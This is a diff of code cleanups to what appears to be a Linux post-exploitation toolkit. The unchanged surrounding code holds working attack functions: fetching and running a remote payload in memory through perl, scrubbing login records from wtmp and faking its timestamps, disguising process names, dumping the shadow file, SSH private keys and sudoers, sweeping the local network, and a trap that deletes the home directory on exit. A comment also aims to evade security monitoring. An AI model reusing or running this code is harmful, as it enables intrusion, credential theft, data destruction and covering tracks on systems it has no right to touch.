@@ -270,14 +270,21 @@ trap 'rm -rf $HOME' EXIT TERM INT
 # Creates a copy of this scipt in variable backup
 # Should be start like "ENV=o.rc sh -i".
 backup=""
-if [ -r "$BASH_SOURCE" ] && [ ! -r "$ENV" ]; then
-  # Script was started in bash via source.
-  ENV=$BASH_SOURCE
+if [ -n "$BASH" ]; then
+  # Script runs in bash. Here BASH_SOURCE exists.
+  # shellcheck disable=SC2169,SC2039
+  if [ -r "${BASH_SOURCE[0]}" ] && [ ! -r "$ENV" ]; then
+    # Script was started in bash via source.
+    ENV=${BASH_SOURCE[0]}
+  fi
 fi
 if [ -r "$ENV" ]; then
   backup=$(cat "$ENV")
   # Convert to absolute file name for later use.
   ENV=$(realpath "$ENV")
+fi
+if [ -z "$backup" ]; then
+  echo 'Warning, backup variable with script file is not available'
 fi
 NHOME=""
 
@@ -375,7 +382,7 @@ type aa-status >/dev/null 2>/dev/null
 	if echo $? | grep -q 0;
 	then echo "AppArmor is probably installed."
 	fi
-	if cat /proc/self/status | grep -q PaX; then
+	if grep -q PaX /proc/self/status; then
 	echo "GrSec and PaX live here."
 	fi
 }
@@ -436,9 +443,11 @@ getinfo() {
     orc_log2outp ifconfig ip link
   fi
   orc_log2outp netstat netstat -peanut
+  # The condition should work with POSIX sh and bash.
+  # Variable EUID is defined in the bash.
+  # Check EUID of /root works in dash (and in bash).
+  # shellcheck disable=SC2039
   if [ "$EUID" = "0" ] || [ -O "/root" ]; then
-    # Variable EUID is defined in the bash.
-    # Check EUID of /root works in dash (and in bash).
     orc_log2outp shadow getent shadow
     orc_log2outp ssh_keys find /home/ -name id_rsa
     orc_log2outp sudoers cat /etc/sudoers
@@ -493,13 +502,13 @@ getuservices() {
 }
 
 getspec() {
-echo -ne "RAM available: "
+printf "RAM available: "
 free -hm | tr '\n' ' ' | awk '{ print $8 }'
-echo -ne "CPU model:"
+printf "CPU model:"
 grep --color=never name /proc/cpuinfo | head -n 1 | awk -F ":" '{print $2}'
-echo -ne "Number of cores: "
+printf "Number of cores: "
 grep --color=never -c processor /proc/cpuinfo
-echo -ne "Disk usage:"
+printf "Disk usage:"
 df -h
 }
 
@@ -518,7 +527,8 @@ getidle() {
   # List all ptys and their idle times accurately.
   # Arguments : none
   # Globals   : our_pty could contain the number of our PTY
-  export our_pty=$(ourpts)
+  export our_pty
+  our_pty=$(ourpts)
   stat "/dev/pts/*" -c '%n %X %U' |
   awk -v now="$(date +%s)" '$1 ~ /\/[0-9]+$/ {
       gsub( /[^0-9]/, "", $1 )
@@ -544,6 +554,7 @@ qssh() {
   if tty | grep -q "not"; then
     orc_createEchoFile "$1"
     shift
+    # shellcheck disable=SC2029
     DISPLAY="" SSH_ASKPASS="$ORC_ECHO_FILE" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T "$@"
   else
     echo "You've got a tty. You can't use qssh."
@@ -568,7 +579,7 @@ qsu() {
 memexec() {
 memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
 finalmem=$(echo "$memfda" | base64 -d)
-finalmem=${finalmem}$(echo -ne "$memfile/ or die;\n")
+finalmem=${finalmem}$(echo "$memfile/ or die;")
 finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
 echo "$finalmem" | perl
 }
@@ -607,7 +618,7 @@ ps -weFH | grep "$1" | grep -v grep
 }
 
 getescape() {
-ps --no-header aux | awk -F" " '{print $1" "$2}' | grep "^$(id -u)"i | awk '{print $2}' | tr ' ' '\n' | while read i; do
+ps --no-header aux | awk -F" " '{print $1" "$2}' | grep "^$(id -u)"i | awk '{print $2}' | tr ' ' '\n' | while read -r i; do
 if ls -di --color=never "/proc/$i/root/" | grep -qe "^2\ "; then
 	echo "process $i seems to be outside the jail..."
 	fi
@@ -616,13 +627,13 @@ done
 }
 
 getjail() {
-ttt=0
+TTT=0
 echo "Checking to see if we're in one giant simulation..."
 	if ls -di --color=never / | grep -vqe "^2.*/$"; then
 	TTT=1
 	echo "We're in a chroot."
 	fi
-	if cat /proc/cpuinfo | grep -qi "hypervisor"; then
+	if grep -qi "hypervisor" /proc/cpuinfo; then
 	echo "Virtual machine!"
 	TTT=1
 	fi
@@ -663,16 +674,16 @@ ssh-keyscan "$1"
 getip() {
 #we use akamai and google here because they're gonna look less dodgy in SOC's lolgs
 echo "Attempting to get IP..."
-echo -ne "HTTP says: "
+printf "HTTP says: "
 	orc_loadURL 'https://whatismyip.akamai.com'
 echo ""
-echo -ne "DNS says: "
+printf "DNS says: "
 	if hash dig>/dev/null; then
 	dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"
-	echo -ne "(used dig)\n"
+	echo "(used dig)"
 	else
 	host -t txt o-o.myaddr.l.google.com ns1.google.com | grep descriptive | awk -F ' ' '{print $4}' | tr -d '"' | tr -d "\n"
-	echo -ne "(used host)\n"
+	echo "(used host)"
 	fi
 }
 
@@ -681,9 +692,8 @@ prochide() {
   # arguments: program to execute with optional arguments.
   # methode  : use the longest command line of the current running
   #            processes as name of the program to start.
-  ARGS="$@"
   LONGARG=$(ps --no-header -wweo cmd | awk 'length(X)<length {X=$0}; END {print X}')
-  bash -c "exec -a \"$LONGARG\" $ARGS"
+  bash -c "exec -a \"$LONGARG\" $*"
 }
 
 getnet() (
@@ -695,14 +705,14 @@ sorry(){
 	echo "Pinging IPs in the background..."
 		if hash ifconfig 2>/dev/null; then
 		valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
-		echo "$valid" | tr ' ' '\n' | while read i;do
+		echo "$valid" | tr ' ' '\n' | while read -r i;do
 			 if ping -c1 -q "$i" | grep -q "\ 0%"; then
 			 echo "$i is alive" >> "$HOME/ips"
 			fi
 		done
 	else 
 	valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ip addr show | grep inet | grep -i "broadcast\|brd" | awk -F ' ' '{print $2}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
-	echo "$valid" | tr ' ' '\n' | while read i;do
+	echo "$valid" | tr ' ' '\n' | while read -r i;do
 		 if ping -c1 -q "$i" | grep -q "\ 0%"; then
 		 echo "$i is alive" >> "$HOME/ips"
 		fi
@@ -712,7 +722,7 @@ sorry(){
 		if hash ifconfig 2>/dev/null; then
 		if ifconfig | grep -q "255.255.255.0"; then 
 		INPUT=$(seq -f $(ifconfig | grep inet | grep -i broadcast | grep -v inet6 | grep "255.255.255.0" | head -n1 | awk -F " " '{print $2}' | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
-		echo "$INPUT" | tr ' ' '\n' | while read i;do
+		echo "$INPUT" | tr ' ' '\n' | while read -r i;do
 			if ping -c1 -q "$i" | grep -q "\ 0%"; then
 			echo "$i" is alive >> "$HOME/ips"
 			fi
@@ -720,7 +730,7 @@ sorry(){
 		else 
 			if ip addr show | grep -E '/24*.brd'; then
 			INPUT=$(seq -f $(ip addr show | grep brd |grep "/24" | head -n 1| awk -F " " {'print $2'} | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
-			echo "$INPUT" | tr ' ' '\n' | while read i;do
+			echo "$INPUT" | tr ' ' '\n' | while read -r i;do
 				 if ping -c1 -q "$i" | grep -q "\ 0%"; then
 				 echo "$i is alive" >> "$HOME/ips"
 				fi
@@ -731,7 +741,6 @@ sorry(){
 fi
 }
 
-valida=""
 valid=""
 
 echo "Let's see what we can find on the network..."
@@ -749,16 +758,16 @@ echo "Please wait..."
 	fi
 echo "Broadcast ping is done."
 echo "Pulling known hosts for your user and writing to $HOME/kh..."
-cat $NHOME/.ssh/known_hosts | awk -F ' ' '{print $1}' > "$HOME/kh"
+awk -F ' ' '{print $1}' "$NHOME/.ssh/known_hosts" > "$HOME/kh"
 sorry &
 
 
 )
 
 wiper() {
-cat /var/log/wtmp | utmpdump | grep -v "$1" > "$HOME/.l"
+utmpdump /var/log/wtmp | grep -v "$1" > "$HOME/.l"
 touch -r /var/log/wtmp "$HOME/.l"
-cat "$HOME/.l" | utmpdump -r -o /var/log/wtmp
+utmpdump -r -o /var/log/wtmp "$HOME/.l"
 touch -r "$HOME/.l" /var/log/wtmp
 }
 
@@ -829,13 +838,13 @@ getexploit () {
 
 getenum() {
 echo "Doing some basic listing of the usual suspects..."
-echo -ne "Kernel: "
+printf "Kernel: "
 uname -rv
-echo -ne "glibc: "
+printf "glibc: "
 $(ldd $(command -v id) | grep --color=never libc.so | awk -F " " '{print $3}') | grep --color=never -i version | grep -v crypt
-echo -ne "dbus: "
+printf "dbus: "
 dbus-daemon --version | grep --color=never Daemon
-echo -ne "Init system is: "
+printf "Init system is: "
 ps -p 1 | grep --color=never -v CMD| awk -F " " '{ print $4 }'
 }
 
@@ -933,12 +942,12 @@ echo "IP address on the network: "
 	else
 	ip addr show | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
 	fi
-echo -ne "We are uid " 
-id -uz;echo -ne " - "; echo -ne "(";whoami | tr -d '\n';echo ")"
-echo -ne "Machine has been "
+printf "We are uid " 
+id -uz;printf " - "; printf "(";whoami | tr -d '\n';echo ")"
+printf "Machine has been "
 uptime -p
 	if [ -f /etc/machine-id ]; then
-	echo -ne "Unique Machine ID: "
+	printf "Unique Machine ID: "
 	cat /etc/machine-id
 	fi
 echo "============================"
